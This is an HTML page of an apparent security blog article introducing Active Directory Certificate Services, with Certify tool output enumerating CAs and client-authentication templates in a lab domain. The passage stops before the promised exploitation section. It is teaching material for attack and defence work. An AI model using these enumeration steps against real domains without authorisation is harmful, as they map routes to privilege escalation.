
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AD - Certificate Services</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link href="/css/articles.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">
    <link href="/css/monokai.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-logo">
                    <img src="/img/new-logo.png" alt="Logo">
                    <h3>elswix</h3>
                </div>
                <nav>
                    <ul class="nav flex-column">
                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
                    </ul>
                </nav>
            </aside>
            <!-- Main Content -->
            <main>
                <!-- Hero Section -->
                <section class="hero mb-5">
                    <img src="/img/articles/logo17.png" alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%">
                    <br/><h2>AD - Certificate Services</h2><br/>
                    <p>Understanding Active Directory Certificate Services</p>
                </section>
                <section class="article-content">
                    <div class="article-container">
                        <div class="article-content-main">
                           <br/><h2>Introduction</h2><br/>
<p>Today, we'll delve into Active Directory Certificate Services (ADCS). In this article, we'll cover fundamental concepts and later introduce exploitation techniques, as well as how to exploit them.</p><br/>
<h3>Before We Begin</h3><br/>
<p>Before diving into the article, I want to clarify a few things. Since ADCS is a broad and complex topic, I’ve decided to split it into <strong>two separate articles</strong> to keep things digestible and engaging.</p><br/>
<h3>What to Expect in Part 1 (This Article)</h3><br/>
<p>In this first part, we’ll introduce <strong>Active Directory Certificate Services (ADCS)</strong> and cover <strong>traditional exploitation techniques</strong> that have been used against it. However, <strong>many of these techniques are no longer effective</strong>, at least after the <strong>February 11, 2025, Windows Server update</strong>, which significantly strengthens certificate security.</p><br/>
<p>That being said, <strong>understanding these older attack methods is still crucial</strong>, as they lay the groundwork for how ADCS exploitation works. By studying them, you'll gain a deeper understanding of <strong>how ADCS has been abused in the past and why certain security measures were introduced</strong>.</p><br/>
<h3>What to Expect in Part 2 (Next Article)</h3><br/>
<p>In the second part, we’ll focus on <strong>modern exploitation techniques</strong> that have emerged <strong>after the Certifried patch (<a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">CVE-2022–26923</a>)</strong>, which introduced <strong>new security settings for ADCS</strong>. These changes prevent many of the techniques covered in this article, but attackers have developed new ways to bypass them.</p><br/>
<br/><h2>What is Active Directory Certificate Services (ADCS)?</h2><br/>
<p>In modern corporate environments, security is built on a foundation of trust. One key element of this trust is <strong>Active Directory Certificate Services (ADCS)</strong>, Microsoft’s implementation of a <strong>Public Key Infrastructure (PKI)</strong>. ADCS plays a crucial role in managing digital certificates, enabling organizations to authenticate users, encrypt communications, and ensure the integrity of sensitive data.</p><br/>
<h3>What is Active Directory Certificate Services (ADCS)?</h3><br/>
<p>At its core, ADCS is a system that issues and manages <strong>digital certificates</strong> within an Active Directory (AD) environment. These certificates act as digital IDs, proving the identity of users, computers, and services. Just like a passport verifies a person's identity in the real world, an ADCS-issued certificate allows a system or user to authenticate securely within the network.</p><br/>
<h3>Why is ADCS used in corporate environments?</h3><br/>
<p>Enterprises rely on ADCS for a variety of security functions, such as:</p><br/>
<ul>
<li><strong>User Authentication</strong> – Certificates can replace traditional passwords or strengthen authentication mechanisms like <strong>Smart Card Logon</strong> and <strong>PKINIT (Kerberos authentication with certificates)</strong>.</li>
<li><strong>Secure Communication</strong> – Certificates enable <strong>TLS encryption</strong> for web servers, VPNs, and internal services.</li>
<li><strong>Code and Document Signing</strong> – Ensures software updates and critical documents come from trusted sources, preventing tampering.</li>
<li><strong>Device and Service Authentication</strong> – Servers, applications, and IoT devices can authenticate using certificates, reducing reliance on passwords.</li>
</ul>
<p>Because ADCS integrates directly with <strong>Active Directory</strong>, it streamlines certificate management across an entire organization, making it a powerful security tool when configured correctly.</p><br/>
<h3>Why is ADCS exploitation relevant to attackers?</h3><br/>
<p>Despite its security benefits, ADCS can become a <strong>prime target</strong> for attackers if misconfigured. Since certificates can be used for authentication, unauthorized access to ADCS can allow an attacker to:</p><br/>
<ul>
<li><strong>Bypass password-based authentication</strong> by obtaining valid certificates for user or admin accounts.</li>
<li><strong>Escalate privileges</strong> by exploiting weak or misconfigured certificate templates.</li>
<li><strong>Maintain long-term persistence</strong> by issuing certificates that remain valid even after password changes or account lockouts.</li>
</ul>
<p>A compromised ADCS environment can give an attacker <strong>stealthy access to Active Directory</strong>, making detection much harder. </p><br/>
<h3>Concepts and Terms</h3><br/>
<p>ADCS uses many components to function properly, so let's briefly explain some key terms that we'll use throughout this article:</p><br/>
<ul>
<li><strong>PKI (Public Key Infrastructure)</strong> → A system designed to manage certificates and public key encryption, providing a framework for secure communication and authentication.</li>
<li><strong>AD CS (Active Directory Certificate Services)</strong> → Microsoft’s implementation of PKI, integrated with Active Directory to issue and manage certificates within an enterprise.</li>
<li><strong>CA (Certification Authority)</strong> → A server responsible for issuing, managing, and revoking certificates. It acts as the trust anchor in a PKI environment.</li>
<li><strong>Enterprise CA</strong> → A type of CA that is integrated into Active Directory. It can issue certificates based on <strong>certificate templates</strong>, allowing for centralized management and automation.</li>
<li><strong>Certificate Template</strong> → A predefined collection of settings and policies that define the structure, permissions, and allowed uses of a certificate issued by an <strong>Enterprise CA</strong>.</li>
<li><strong>CSR (Certificate Signing Request)</strong> → A digitally signed request sent to a CA containing the information necessary to issue a certificate, including the requester’s public key.</li>
<li><strong>EKU (Extended Key Usage)</strong> → A list of <strong>object identifiers (OIDs)</strong> that specify the intended use of a certificate, such as <strong>Code Signing, Client Authentication, Smart Card Logon</strong>, etc.</li>
</ul>
<h3><strong>Root CA vs. Subordinate CA</strong></h3><br/>
<p>In a <strong>PKI hierarchy</strong>, not all CAs have the same role. There are <strong>two main types of CAs</strong> that work together to ensure a scalable and secure certificate issuance process:</p><br/>
<ul>
<li><strong>Root CA</strong> → The <strong>top-level</strong> CA in a PKI hierarchy. It is the ultimate trust anchor and is responsible for issuing certificates to <strong>Subordinate CAs</strong>, not directly to end-users. To minimize security risks, Root CAs are usually <strong>offline</strong> and only used to sign Subordinate CA certificates.</li>
<li><strong>Subordinate CA (Intermediate CA)</strong> → A CA that operates under the Root CA. It is responsible for issuing certificates to users, devices, or services. Subordinate CAs can also be further divided into <strong>Issuing CAs</strong>, which handle the actual distribution of certificates.</li>
</ul>
<p><strong>Why is this hierarchy important?</strong><br/>
Using <strong>Subordinate CAs</strong> allows organizations to keep the <strong>Root CA highly secure</strong> while still maintaining flexible and scalable certificate issuance. If a <strong>Subordinate CA is compromised</strong>, the Root CA can revoke it without affecting the entire PKI infrastructure.</p><br/>
<h3>How ADCS works?</h3><br/>
<p>AD CS is a server role that functions as Microsoft’s implementation of public key infrastructure (PKI). As expected, it integrates with Active Directory and enables the issuance of certificates—X.509-formatted digitally signed electronic documents that can be used for encryption, message signing, and/or authentication (which we'll focus on in our exploration).</p><br/>
<p>A certificate binds an <strong>identity</strong> (the <strong>subject</strong>) to a <strong>public/private key pair</strong>. Applications can then use this key pair for secure operations, serving as <strong>proof of identity</strong>. The issuance of certificates is handled by <strong>Certificate Authorities (CAs)</strong>, which validate and sign them to establish trust within the PKI hierarchy.</p><br/>
<h3>Example of requesting a Certificate</h3><br/>
<p>Let's say a client wants to request a certificate for <strong>authentication purposes</strong>, meaning they will later use it to authenticate against the <strong>Key Distribution Center (KDC)</strong>.</p><br/>
<p>First, the client <strong>generates a public/private key pair</strong> and securely stores it within its system. Then, it creates a <strong>Certificate Signing Request (CSR)</strong>—a message sent to the <strong>Certificate Authority (CA)</strong> to request a signed certificate. This CSR includes:</p><br/>
<ul>
<li>The <strong>client’s public key</strong>.</li>
<li>Identity details (e.g., <strong>subject name</strong>).</li>
<li>The <strong>certificate template</strong> to be used for the final certificate.</li>
</ul>
<p>Once the CSR is prepared, the client submits it to the <strong>Enterprise CA Server</strong>.</p><br/>
<p>When the <strong>CA receives the CSR</strong>, it performs several validation steps:</p><br/>
<ol>
<li><strong>Checks if the client is authorized</strong> to request signed certificates.</li>
<li><strong>Verifies whether the specified certificate template allows</strong> the client to request a certificate.</li>
</ol>
<p>If the request is permitted, the CA <strong>issues a certificate</strong> based on:</p><br/>
<ul>
<li>The <strong>settings defined in the certificate template</strong>, including <strong>EKUs, cryptographic settings, and Subject Alternative Names (SANs)</strong>.</li>
<li>The information provided in the CSR, <strong>if the template allows customization</strong>.</li>
</ul>
<p>Finally, the CA <strong>signs the certificate</strong> using its <strong>private key</strong> and returns it to the client.</p><br/>
<h3>Certificate Templates</h3><br/>
<p>As mentioned earlier, when a client requests a certificate from a <strong>Certificate Authority (CA)</strong>, it includes a <strong>Certificate Template</strong> within the <strong>Certificate Signing Request (CSR)</strong>. A certificate template is an <strong>Active Directory (AD) object</strong> that defines <strong>preconfigured policies and settings</strong> for issued certificates, such as:</p><br/>
<ul>
<li><strong>Certificate lifetime</strong></li>
<li><strong>Allowed usage (EKUs, cryptographic settings, etc.)</strong></li>
<li><strong>Subject name configuration</strong></li>
<li><strong>Enrollment permissions</strong></li>
</ul>
<p>One of the key attributes in a certificate template is <strong><code>pKIExtendedKeyUsage</code></strong>, which contains an array of <strong>Object Identifiers (OIDs)</strong> specifying the intended purposes of the certificate. These OIDs define whether the certificate can be used for <strong>Client Authentication, Code Signing, Secure Email, and more</strong>.</p><br/>
<p>For attackers, <strong>EKUs that allow authentication in Active Directory</strong> are of particular interest. The <strong>SpecterOps</strong> team, in their research, identified several OIDs that enable this functionality:</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/17/img/Cert-Services-1.png"/></p><br/>
<p>For example, if a <strong>certificate template</strong> includes any of these <strong>authentication-related OIDs</strong> in its <strong><code>pKIExtendedKeyUsage</code></strong> attribute, any <strong>certificate issued from this template</strong> can be used for authentication in Active Directory.</p><br/>
<br/><h2>Active Directory Authentication with Certificates</h2><br/>
<p>Now, let's explore how <strong>Kerberos authentication</strong> can be performed using <strong>certificates</strong>. Windows provides various tools for interacting with certificates, but for this article, we’ll use <strong>Certify</strong>, which we’ll also leverage later to exploit ADCS vulnerabilities.</p><br/>
<p>Before diving in, there are a few important concepts to understand.</p><br/>
<h3>The Role of NTAuthCertificates in Authentication</h3><br/>
<p>Not every <strong>Certificate Authority (CA)</strong> within an <strong>Active Directory (AD) environment</strong> is automatically trusted for authentication. For a CA to issue certificates that can be used for <strong>Kerberos authentication (PKINIT)</strong>, its <strong>root or subordinate CA certificates must be explicitly trusted</strong> by the <strong>NTAuthCertificates</strong> container in Active Directory.</p><br/>
<br/><h3>What is NTAuthCertificates?</h3><br/>
<p>The <strong>NTAuthCertificates</strong> container is a special <strong>Active Directory object</strong> that stores <strong>CA certificates explicitly trusted</strong> for authentication-related operations, such as:</p><br/>
<ul>
<li><strong>Smart Card Logon</strong></li>
<li><strong>Kerberos PKINIT Authentication</strong></li>
<li><strong>Certificate-Based Authentication for AD-integrated services</strong></li>
</ul>
<p>If a <strong>CA’s certificate is not present</strong> in <strong>NTAuthCertificates</strong>, then even if it is a valid and trusted CA within the domain, its issued certificates <strong>cannot be used for authentication</strong> in Active Directory.</p><br/>
<h3>Authentication</h3><br/>
<p>Now, let's put <strong>Active Directory Certificate Services (ADCS)</strong> into practice. As mentioned earlier, I’ll be using <strong><a href="https://github.com/GhostPack/Certify">Certify</a></strong> to perform <strong>certificate-based authentication</strong>.</p><br/>
<p>Certify is a <strong>C# tool</strong> designed for interacting with ADCS via <strong>LDAP queries</strong>. It allows us to:</p><br/>
<ul>
<li><strong>Enumerate available Certificate Authorities (CAs)</strong> in the domain.</li>
<li><strong>Check which CAs are trusted for authentication</strong> (i.e., included in the <code>NTAuthCertificates</code> container).</li>
<li><strong>List and request certificates from published certificate templates.</strong></li>
<li><strong>Identify misconfigurations</strong> that could lead to ADCS exploitation.</li>
</ul>
<h3><strong>Finding a CA That Supports Client Authentication</strong></h3><br/>
<p>First, we need to identify a <strong>CA that allows client authentication</strong>, meaning it is included in the <strong><code>NTAuthCertificates</code> container</strong> in Active Directory:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">cas</span>

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Find</span> <span class="n">certificate</span> <span class="n">authorities</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">search</span> <span class="n">base</span> <span class="s1">'CN=Configuration,DC=elswixcorp,DC=local'</span>


<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>



<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">NTAuthCertificates</span> <span class="o">-</span> <span class="n">Certificates</span> <span class="n">that</span> <span class="n">enable</span> <span class="n">authentication</span><span class="p">:</span>

    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="mi">7</span><span class="n">EBA7E914D6B66FC78E96E001271745D3C045874</span>
    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="mi">1</span><span class="n">A66B5E7D16772A94482CC2F0BB1D1C9</span>
    <span class="n">Cert</span> <span class="n">Start</span> <span class="n">Date</span>               <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">2</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">5</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">10</span> <span class="n">AM</span>
    <span class="n">Cert</span> <span class="n">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">2</span><span class="o">/</span><span class="mi">2030</span> <span class="mi">5</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">09</span> <span class="n">AM</span>
    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mf">09.3377942</span>
</pre></div>
<p>As seen in the output, the CA <strong><code>elswixcorp-DC01-CA</code></strong> is trusted for authentication. This means we can request certificates from this CA and use them for <strong>Kerberos authentication</strong>, provided that the requested certificate includes an <strong>Extended Key Usage (EKU) that allows authentication</strong>.</p><br/>
<p>In this case, <code>elswixcorp-DC01-CA</code> is a <strong>Root CA</strong>. While it's uncommon for Root CAs to be online in real-world Active Directory environments (since they are typically kept offline for security reasons), this is a <strong>local lab setup</strong>, so I installed the CA directly on the <strong>Domain Controller (DC)</strong> for testing purposes.</p><br/>
<h3>Finding a Certificate Template That Allows Authentication</h3><br/>
<p>Now that we’ve identified a <strong>CA that supports authentication</strong>, we need to find a <strong>certificate template</strong> that allows <strong>Client Authentication</strong>. The certificate must contain the <strong>Client Authentication EKU</strong> in its <code>pKIExtendedKeyUsage</code> attribute; otherwise, it won’t work for authentication.</p><br/>
<p>By default, the <strong>"User" template</strong> is often enabled in AD environments, and it includes the <strong>Client Authentication EKU</strong>. However, if:</p><br/>
<ul>
<li>You are unsure <strong>which templates</strong> allow authentication.</li>
<li>The default <strong>User template is disabled</strong>.</li>
</ul>
<p>You can use <strong>Certify</strong> to <strong>enumerate all certificate templates that permit authentication</strong>. To do this, we can run Certify with the <code>/clientauth</code> parameter, which will specifically list <strong>enabled templates that support client authentication</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">find</span> <span class="o">/</span><span class="n">clientauth</span>

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Find</span> <span class="n">certificate</span> <span class="n">templates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">search</span> <span class="n">base</span> <span class="s1">'CN=Configuration,DC=elswixcorp,DC=local'</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Listing</span> <span class="n">info</span> <span class="n">about</span> <span class="n">the</span> <span class="n">Enterprise</span> <span class="n">CA</span> <span class="s1">'elswixcorp-DC01-CA'</span>

    <span class="n">Enterprise</span> <span class="n">CA</span> <span class="n">Name</span>            <span class="p">:</span> <span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">DNS</span> <span class="n">Hostname</span>                  <span class="p">:</span> <span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
    <span class="n">FullName</span>                      <span class="p">:</span> <span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">Flags</span>                         <span class="p">:</span> <span class="n">SUPPORTS_NT_AUTHENTICATION</span><span class="p">,</span> <span class="n">CA_SERVERTYPE_ADVANCED</span>
    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="mi">7</span><span class="n">EBA7E914D6B66FC78E96E001271745D3C045874</span>
    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="mi">1</span><span class="n">A66B5E7D16772A94482CC2F0BB1D1C9</span>
    <span class="n">Cert</span> <span class="n">Start</span> <span class="n">Date</span>               <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">2</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">5</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">10</span> <span class="n">AM</span>
    <span class="n">Cert</span> <span class="n">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">2</span><span class="o">/</span><span class="mi">2030</span> <span class="mi">5</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">09</span> <span class="n">AM</span>
    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
    <span class="n">UserSpecifiedSAN</span>              <span class="p">:</span> <span class="n">Disabled</span>
    <span class="n">CA</span> <span class="n">Permissions</span>                <span class="p">:</span>
      <span class="n">Owner</span><span class="p">:</span> <span class="n">BUILTIN</span>\<span class="n">Administrators</span>        <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">544</span>

      <span class="n">Access</span> <span class="n">Rights</span>                                     <span class="n">Principal</span>

      <span class="n">Allow</span>  <span class="n">Enroll</span>                                     <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">Authenticated</span> <span class="n">UsersS</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">11</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">BUILTIN</span>\<span class="n">Administrators</span>        <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">544</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>
    <span class="n">Enrollment</span> <span class="n">Agent</span> <span class="n">Restrictions</span> <span class="p">:</span> <span class="kc">None</span>


<span class="n">Enabled</span> <span class="n">certificate</span> <span class="n">templates</span> <span class="n">capable</span> <span class="n">of</span> <span class="n">client</span> <span class="n">authentication</span><span class="p">:</span>
    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">DC01</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">User</span>
    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="mi">1</span>
    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="mi">1</span> <span class="n">year</span>
    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="mi">6</span> <span class="n">weeks</span>
    <span class="n">msPKI</span><span class="o">-</span><span class="n">Certificate</span><span class="o">-</span><span class="n">Name</span><span class="o">-</span><span class="n">Flag</span>          <span class="p">:</span> <span class="n">SUBJECT_ALT_REQUIRE_UPN</span><span class="p">,</span> <span class="n">SUBJECT_ALT_REQUIRE_EMAIL</span><span class="p">,</span> <span class="n">SUBJECT_REQUIRE_EMAIL</span><span class="p">,</span> <span class="n">SUBJECT_REQUIRE_DIRECTORY_PATH</span>
    <span class="n">mspki</span><span class="o">-</span><span class="n">enrollment</span><span class="o">-</span><span class="n">flag</span>                 <span class="p">:</span> <span class="n">INCLUDE_SYMMETRIC_ALGORITHMS</span><span class="p">,</span> <span class="n">PUBLISH_TO_DS</span><span class="p">,</span> <span class="n">AUTO_ENROLLMENT</span>
    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="mi">0</span>
    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
    <span class="n">mspki</span><span class="o">-</span><span class="n">certificate</span><span class="o">-</span><span class="n">application</span><span class="o">-</span><span class="n">policy</span>  <span class="p">:</span> <span class="o">&lt;</span><span class="n">null</span><span class="o">&gt;</span>
    <span class="n">Permissions</span>
      <span class="n">Enrollment</span> <span class="n">Permissions</span>
        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Users</span>       <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">513</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>


